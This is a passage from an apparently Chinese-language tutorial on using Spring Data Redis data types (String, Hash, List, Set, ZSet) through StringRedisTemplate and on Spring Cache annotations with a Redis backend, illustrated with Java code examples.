<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testString</span><span class="params">()</span> &#123;</span><br><span class="line">    ValueOperations&lt;String, String&gt; ops = stringRedisTemplate.opsForValue();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 设置键值 (SET key value)</span></span><br><span class="line">    ops.set(<span class="string">&quot;user:1:name&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 设置键值并带过期时间 (SETEX key seconds value)</span></span><br><span class="line">    ops.set(<span class="string">&quot;sms:code:138xxxx&quot;</span>, <span class="string">&quot;123456&quot;</span>, <span class="number">60</span>, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 获取键值 (GET key)</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> ops.get(<span class="string">&quot;user:1:name&quot;</span>); <span class="comment">// &quot;Alice&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 获取多个键值 (MGET key1 key2 ...)</span></span><br><span class="line">    List&lt;String&gt; values = ops.multiGet(Arrays.asList(<span class="string">&quot;user:1:name&quot;</span>, <span class="string">&quot;another_key&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 原子性自增 (INCR key) - 值必须是数字字符串</span></span><br><span class="line">    ops.set(<span class="string">&quot;page:view:1001&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    ops.increment(<span class="string">&quot;page:view:1001&quot;</span>); <span class="comment">// 返回 1</span></span><br><span class="line">    ops.increment(<span class="string">&quot;page:view:1001&quot;</span>, <span class="number">10</span>); <span class="comment">// 增加10，返回 11</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 原子性自减 (DECR key)</span></span><br><span class="line">    ops.decrement(<span class="string">&quot;page:view:1001&quot;</span>); <span class="comment">// 返回 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-3-2-Hash-哈希"><a href="#4-3-2-Hash-哈希" class="headerlink" title="4.3.2 Hash (哈希)"></a>4.3.2 Hash (哈希)</h4><p>一个key对应一个<code>Map&lt;String, String&gt;</code>，非常适合用来存储一个<strong>对象</strong>的多个字段。</p>
<ul>
<li><strong>用途</strong>: 存储一个用户的多个属性（姓名、年龄、邮箱），避免为每个属性都创建一个顶层key。</li>
<li><strong>操作接口</strong>: <code>HashOperations&lt;String, HK, HV&gt;</code> (通过 <code>stringRedisTemplate.opsForHash()</code>)</li>
</ul>
<p><strong>常用方法</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHash</span><span class="params">()</span> &#123;</span><br><span class="line">    HashOperations&lt;String, String, String&gt; ops = stringRedisTemplate.opsForHash();</span><br><span class="line">    <span class="type">String</span> <span class="variable">userKey</span> <span class="operator">=</span> <span class="string">&quot;user:profile:1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 设置单个字段值 (HSET key field value)</span></span><br><span class="line">    ops.put(userKey, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">    ops.put(userKey, <span class="string">&quot;age&quot;</span>, <span class="string">&quot;30&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 一次性设置多个字段值 (HMSET key field1 value1 ...)</span></span><br><span class="line">    Map&lt;String, String&gt; userFields = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    userFields.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;bob@example.com&quot;</span>);</span><br><span class="line">    userFields.put(<span class="string">&quot;city&quot;</span>, <span class="string">&quot;New York&quot;</span>);</span><br><span class="line">    ops.putAll(userKey, userFields);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 获取单个字段值 (HGET key field)</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> ops.get(userKey, <span class="string">&quot;name&quot;</span>); <span class="comment">// &quot;Bob&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 获取多个字段值 (HMGET key field1 field2 ...)</span></span><br><span class="line">    List&lt;String&gt; fields = ops.multiGet(userKey, Arrays.asList(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;age&quot;</span>, <span class="string">&quot;city&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 获取所有字段和值 (HGETALL key)</span></span><br><span class="line">    Map&lt;String, String&gt; allFields = ops.entries(userKey);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 删除一个或多个字段 (HDEL key field1 ...)</span></span><br><span class="line">    ops.delete(userKey, <span class="string">&quot;city&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 判断字段是否存在 (HEXISTS key field)</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> ops.hasKey(userKey, <span class="string">&quot;email&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-3-3-List-列表"><a href="#4-3-3-List-列表" class="headerlink" title="4.3.3 List (列表)"></a>4.3.3 List (列表)</h4><p>一个key对应一个<strong>有序的、可重复的</strong>字符串列表。它是一个双向链表，所以在两端添加和删除元素非常快。</p>
<ul>
<li><strong>用途</strong>: 实现消息队列（生产者LPUSH，消费者BRPOP）、存储文章的评论列表、最新动态列表。</li>
<li><strong>操作接口</strong>: <code>ListOperations&lt;String, String&gt;</code> (通过 <code>stringRedisTemplate.opsForList()</code>)</li>
</ul>
<p><strong>常用方法</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testList</span><span class="params">()</span> &#123;</span><br><span class="line">    ListOperations&lt;String, String&gt; ops = stringRedisTemplate.opsForList();</span><br><span class="line">    <span class="type">String</span> <span class="variable">tasksKey</span> <span class="operator">=</span> <span class="string">&quot;tasks:queue&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从左侧推入元素 (LPUSH key value1 [value2 ...])</span></span><br><span class="line">    ops.leftPush(tasksKey, <span class="string">&quot;Task A&quot;</span>);</span><br><span class="line">    ops.leftPushAll(tasksKey, <span class="string">&quot;Task B&quot;</span>, <span class="string">&quot;Task C&quot;</span>); <span class="comment">// 现在的顺序: C, B, A</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 从右侧推入元素 (RPUSH key value1 [value2 ...])</span></span><br><span class="line">    ops.rightPush(tasksKey, <span class="string">&quot;Task D&quot;</span>); <span class="comment">// 现在的顺序: C, B, A, D</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 从左侧弹出元素 (LPOP key)</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">task</span> <span class="operator">=</span> ops.leftPop(tasksKey); <span class="comment">// &quot;C&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 从右侧弹出元素 (RPOP key)</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">lastTask</span> <span class="operator">=</span> ops.rightPop(tasksKey); <span class="comment">// &quot;D&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5. 阻塞式地从左侧弹出元素 (BLPOP key timeout) - 消息队列核心</span></span><br><span class="line">    <span class="comment">// 如果列表为空，会阻塞等待最多10秒，直到有新元素或超时</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">blockingTask</span> <span class="operator">=</span> ops.leftPop(tasksKey, <span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 获取列表长度 (LLEN key)</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">size</span> <span class="operator">=</span> ops.size(tasksKey);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 获取指定范围的元素 (LRANGE key start stop) - 0是第一个，-1是最后一个</span></span><br><span class="line">    List&lt;String&gt; allTasks = ops.range(tasksKey, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-3-4-Set-集合"><a href="#4-3-4-Set-集合" class="headerlink" title="4.3.4 Set (集合)"></a>4.3.4 Set (集合)</h4><p>一个key对应一个<strong>无序的、唯一的</strong>字符串集合。</p>
<ul>
<li><strong>用途</strong>: 存储一篇文章的点赞用户ID、一个用户的标签、共同好友计算。</li>
<li><strong>操作接口</strong>: <code>SetOperations&lt;String, String&gt;</code> (通过 <code>stringRedisTemplate.opsForSet()</code>)</li>
</ul>
<p><strong>常用方法</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSet</span><span class="params">()</span> &#123;</span><br><span class="line">    SetOperations&lt;String, String&gt; ops = stringRedisTemplate.opsForSet();</span><br><span class="line">    <span class="type">String</span> <span class="variable">post1Likes</span> <span class="operator">=</span> <span class="string">&quot;post:1:likes&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">post2Likes</span> <span class="operator">=</span> <span class="string">&quot;post:2:likes&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 添加一个或多个成员 (SADD key member1 [member2 ...])</span></span><br><span class="line">    ops.add(post1Likes, <span class="string">&quot;user:101&quot;</span>, <span class="string">&quot;user:102&quot;</span>, <span class="string">&quot;user:103&quot;</span>);</span><br><span class="line">    ops.add(post2Likes, <span class="string">&quot;user:102&quot;</span>, <span class="string">&quot;user:104&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 获取所有成员 (SMEMBERS key)</span></span><br><span class="line">    Set&lt;String&gt; members = ops.members(post1Likes);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 判断成员是否存在 (SISMEMBER key member)</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isMember</span> <span class="operator">=</span> ops.isMember(post1Likes, <span class="string">&quot;user:101&quot;</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 获取集合大小 (SCARD key)</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">size</span> <span class="operator">=</span> ops.size(post1Likes);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 移除一个或多个成员 (SREM key member1 ...)</span></span><br><span class="line">    ops.remove(post1Likes, <span class="string">&quot;user:103&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 6. 集合运算</span></span><br><span class="line">    <span class="comment">// 交集 (SINTER key1 key2): 同时点赞了文章1和文章2的用户</span></span><br><span class="line">    Set&lt;String&gt; intersection = ops.intersect(post1Likes, post2Likes); <span class="comment">// &#123;&quot;user:102&quot;&#125;</span></span><br><span class="line">    <span class="comment">// 并集 (SUNION key1 key2): 至少点赞了一篇文章的用户</span></span><br><span class="line">    Set&lt;String&gt; union = ops.union(post1Likes, post2Likes);</span><br><span class="line">    <span class="comment">// 差集 (SDIFF key1 key2): 点赞了文章1但没点赞文章2的用户</span></span><br><span class="line">    Set&lt;String&gt; difference = ops.difference(post1Likes, post2Likes); <span class="comment">// &#123;&quot;user:101&quot;&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-3-5-ZSet-有序集合"><a href="#4-3-5-ZSet-有序集合" class="headerlink" title="4.3.5 ZSet (有序集合)"></a>4.3.5 ZSet (有序集合)</h4><p>ZSet (Sorted Set) 是Set的升级版，它在每个成员上关联了一个<strong>分数 (score)</strong>，并根据这个分数对成员进行<strong>排序</strong>。成员是唯一的，但分数可以重复。</p>
<ul>
<li><strong>用途</strong>: 排行榜（按分数排序）、带有权重的任务队列、范围查找（如查找分数在某个区间的成员）。</li>
<li><strong>操作接口</strong>: <code>ZSetOperations&lt;String, String&gt;</code> (通过 <code>stringRedisTemplate.opsForZSet()</code>)</li>
</ul>
<p><strong>常用方法</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testZSet</span><span class="params">()</span> &#123;</span><br><span class="line">    ZSetOperations&lt;String, String&gt; ops = stringRedisTemplate.opsForZSet();</span><br><span class="line">    <span class="type">String</span> <span class="variable">leaderboardKey</span> <span class="operator">=</span> <span class="string">&quot;game:leaderboard&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 添加成员并指定分数 (ZADD key score1 member1 [score2 member2 ...])</span></span><br><span class="line">    ops.add(leaderboardKey, <span class="string">&quot;player:alice&quot;</span>, <span class="number">1500.0</span>);</span><br><span class="line">    ops.add(leaderboardKey, <span class="string">&quot;player:bob&quot;</span>, <span class="number">1800.0</span>);</span><br><span class="line">    ops.add(leaderboardKey, <span class="string">&quot;player:charlie&quot;</span>, <span class="number">1200.0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 为成员增加分数 (ZINCRBY key increment member)</span></span><br><span class="line">    ops.incrementScore(leaderboardKey, <span class="string">&quot;player:alice&quot;</span>, <span class="number">50.0</span>); <span class="comment">// Alice的分数变为1550</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 获取指定成员的分数 (ZSCORE key member)</span></span><br><span class="line">    <span class="type">Double</span> <span class="variable">score</span> <span class="operator">=</span> ops.score(leaderboardKey, <span class="string">&quot;player:bob&quot;</span>); <span class="comment">// 1800.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 按分数范围获取成员 (ZRANGEBYSCORE key min max)</span></span><br><span class="line">    Set&lt;String&gt; players = ops.rangeByScore(leaderboardKey, <span class="number">1500</span>, <span class="number">2000</span>); <span class="comment">// &#123;&quot;player:alice&quot;, &quot;player:bob&quot;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 按排名范围获取成员 (ZRANGE key start stop) - 分数从低到高</span></span><br><span class="line">    Set&lt;String&gt; top3Asc = ops.range(leaderboardKey, <span class="number">0</span>, <span class="number">2</span>); <span class="comment">// Charlie, Alice, Bob</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 按排名范围获取成员 (ZREVRANGE key start stop) - 分数从高到低</span></span><br><span class="line">    Set&lt;String&gt; top3Desc = ops.reverseRange(leaderboardKey, <span class="number">0</span>, <span class="number">2</span>); <span class="comment">// Bob, Alice, Charlie</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 获取成员的排名 (ZRANK / ZREVRANK)</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">rank</span> <span class="operator">=</span> ops.rank(leaderboardKey, <span class="string">&quot;player:alice&quot;</span>); <span class="comment">// 1 (从0开始，升序排名)</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">reverseRank</span> <span class="operator">=</span> ops.reverseRank(leaderboardKey, <span class="string">&quot;player:alice&quot;</span>); <span class="comment">// 1 (从0开始，降序排名)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 8. 获取集合大小 (ZCARD key)</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">size</span> <span class="operator">=</span> ops.size(leaderboardKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-4-SpringCache抽象与Redis实现"><a href="#4-4-SpringCache抽象与Redis实现" class="headerlink" title="4.4 SpringCache抽象与Redis实现"></a>4.4 SpringCache抽象与Redis实现</h3><h4 id="4-4-1-什么是-Spring-Cache-抽象？"><a href="#4-4-1-什么是-Spring-Cache-抽象？" class="headerlink" title="4.4.1 什么是 Spring Cache 抽象？"></a>4.4.1 什么是 Spring Cache 抽象？</h4><p><strong>问题背景</strong>：<br>在应用中，对于那些<strong>读多写少</strong>、<strong>计算成本高</strong>且<strong>数据不经常变化</strong>的操作（例如，从数据库查询商品详情、计算复杂的报表），我们通常会引入<strong>缓存</strong>来提升性能和降低后端负载。</p>
<p><strong>传统的缓存实现方式</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Service层手动编写缓存逻辑</span></span><br><span class="line"><span class="keyword">public</span> Product <span class="title function_">getProductById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 先从缓存中查找</span></span><br><span class="line">    <span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> cacheManager.get(<span class="string">&quot;productCache&quot;</span>, id);</span><br><span class="line">    <span class="keyword">if</span> (product != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> product; <span class="comment">// 缓存命中，直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 缓存未命中，从数据库查询</span></span><br><span class="line">    product = productRepository.findById(id).orElse(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将查询结果放入缓存</span></span><br><span class="line">    <span class="keyword">if</span> (product != <span class="literal">null</span>) &#123;</span><br><span class="line">        cacheManager.put(<span class="string">&quot;productCache&quot;</span>, id, product);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这种方式的痛点</strong>:</p>
<ol>
<li><strong>代码侵入性强</strong>: 缓存逻辑（<code>get</code>, <code>put</code>, <code>evict</code>）与业务逻辑<strong>高度耦合</strong>，混杂在一起，使得业务代码变得复杂和不纯粹。</li>
<li><strong>重复劳动</strong>: 每个需要缓存的方法都得写一遍类似的逻辑。</li>
<li><strong>缓存技术更换困难</strong>: 如果想从 Guava Cache 换成 Redis Cache，你需要修改所有相关的业务代码。</li>
</ol>
<p><strong>Spring Cache 抽象的解决方案</strong>:<br>Spring Cache 提供了一套<strong>基于注解</strong>的、<strong>与具体缓存技术无关</strong>的抽象层。它的核心思想是：</p>
<ul>
<li><strong>将缓存操作声明化</strong>: 开发者不再需要手动编写缓存的读写逻辑，而是通过在方法上添加简单的注解（如 <code>@Cacheable</code>），来**“声明”**这个方法的缓存行为。</li>
<li><strong>AOP实现</strong>: Spring 在底层通过**AOP（面向切面编程）**来拦截这些被注解标记的方法调用。<ul>
<li>在方法<strong>执行前</strong>，AOP切面会先检查缓存。如果命中，则直接返回缓存结果，<strong>不再执行</strong>方法体。</li>
<li>如果缓存未命中，AOP切面会<strong>执行</strong>方法体，获取返回值，然后在方法<strong>返回后</strong>，自动将结果放入缓存。</li>
</ul>
</li>
<li><strong>技术无关性</strong>: 你的业务代码只依赖于Spring Cache的注解，而<strong>不关心底层到底是用Redis、Caffeine、EhCache还是ConcurrentHashMap</strong>。底层的缓存实现是可插拔的，通过配置文件即可轻松切换。</li>
</ul>
<p><strong>最终效果</strong>: 业务代码回归纯粹，缓存逻辑被优雅地分离出去。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 业务代码变得极其简洁</span></span><br><span class="line"><span class="meta">@Cacheable(cacheNames = &quot;productCache&quot;, key = &quot;#id&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Product <span class="title function_">getProductById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="comment">// 只需要保留核心的业务逻辑</span></span><br><span class="line">    <span class="keyword">return</span> productRepository.findById(id).orElse(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-4-2-核心注解"><a href="#4-4-2-核心注解" class="headerlink" title="4.4.2 核心注解"></a>4.4.2 核心注解</h4><p>Spring Cache 主要通过以下三个注解来工作：</p>
<ul>
<li><p><strong><code>@Cacheable</code></strong>: <strong>触发缓存入口</strong></p>
<ul>
<li><strong>作用</strong>: 主要用于<strong>查询</strong>操作。标记在一个方法上，表示该方法的执行结果是可以被缓存的。</li>
<li><strong>执行流程</strong>:<ol>
<li>方法调用前，根据 <code>cacheNames</code> 和 <code>key</code> 生成一个缓存键。</li>
<li>用这个键去缓存中查找。</li>
<li><strong>如果找到</strong>，直接返回缓存的值，<strong>方法体不会被执行</strong>。</li>
<li><strong>如果没找到</strong>，执行方法体，将方法的返回值存入缓存，然后再返回结果。</li>
</ol>
</li>
<li><strong>常用属性</strong>:<ul>
<li><code>cacheNames</code> &#x2F; <code>value</code>: 指定要使用的缓存区域的名称（可以有多个）。</li>
<li><code>key</code>: <strong>缓存的键</strong>。支持 <strong>SpEL (Spring Expression Language)</strong> 来动态生成。<ul>
<li><code>#id</code>: 引用方法参数 <code>id</code>。</li>
<li><code>#p0</code>, <code>#a0</code>: 引用第一个方法参数。</li>
<li><code>#result</code>: 引用方法的返回值（通常用于<code>@CachePut</code>）。</li>
<li><code>#root.methodName</code>: 引用当前方法名。</li>
<li>如果<strong>不指定</strong>，Spring会使用所有方法参数的 <code>hashCode</code> 生成一个默认的key。</li>
</ul>
</li>
<li><code>condition</code>: SpEL表达式，满足条件时才进行缓存。例如 <code>condition = &quot;#result != null&quot;</code>。</li>
<li><code>unless</code>: SpEL表达式，满足条件时<strong>不</strong>进行缓存。例如 <code>unless = &quot;#result.price &lt; 100&quot;</code>。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong><code>@CachePut</code></strong>: <strong>强制更新缓存</strong></p>
<ul>
<li><strong>作用</strong>: 主要用于<strong>更新</strong>操作。</li>
<li><strong>执行流程</strong>: 与 <code>@Cacheable</code> 不同，<code>@CachePut</code> <strong>总是会执行方法体</strong>。在方法执行成功后，它会<strong>强制</strong>将方法的返回值更新到缓存中。</li>
<li><strong>场景</strong>: 当你更新了数据库中的某个对象，并希望<strong>同步更新</strong>缓存中的数据时使用。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CachePut(cacheNames = &quot;productCache&quot;, key = &quot;#product.id&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Product <span class="title function_">updateProduct</span><span class="params">(Product product)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> productRepository.save(product); <span class="comment">// save方法会返回更新后的对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@CacheEvict</code></strong>: <strong>清空缓存</strong></p>
<ul>
<li><strong>作用</strong>: 主要用于<strong>删除</strong>操作。</li>
<li><strong>执行流程</strong>: 方法执行后，会从缓存中<strong>移除</strong>指定的数据。</li>
<li><strong>常用属性</strong>:<ul>
<li><code>cacheNames</code>, <code>key</code>: 指定要移除的缓存项。</li>
<li><code>allEntries = true</code>: 如果设置为 <code>true</code>，则会清空整个 <code>cacheNames</code> 区域的所有缓存，而不是只移除单个key。</li>
<li><code>beforeInvocation = true</code>: 默认是 <code>false</code> (方法执行后清除)。如果设为 <code>true</code>，则在方法执行前就清除缓存，这在方法可能抛出异常的情况下可以保证缓存一定被清除。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CacheEvict(cacheNames = &quot;productCache&quot;, key = &quot;#id&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteProduct</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    productRepository.deleteById(id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清空所有productCache</span></span><br><span class="line"><span class="meta">@CacheEvict(cacheNames = &quot;productCache&quot;, allEntries = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadAllProducts</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ... 重新加载数据的逻辑 ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="4-4-3-使用Redis作为缓存实现"><a href="#4-4-3-使用Redis作为缓存实现" class="headerlink" title="4.4.3 使用Redis作为缓存实现"></a>4.4.3 使用Redis作为缓存实现</h4><p>将Spring Cache的后端从默认的 <code>ConcurrentHashMap</code> 切换为 Redis 非常简单。</p>
<p><strong>Step 1: 添加 <code>spring-boot-starter-data-redis</code> 依赖</strong></p>
<p>(这在之前的章节已经做过)</p>
<p><strong>Step 2: 在启动类上开启缓存功能</strong></p>
<p>在你的Spring Boot主启动类上添加 <code>@EnableCaching</code> 注解。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cache.annotation.EnableCaching;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableCaching</span> <span class="comment">// 开启Spring Cache的注解功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MyApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

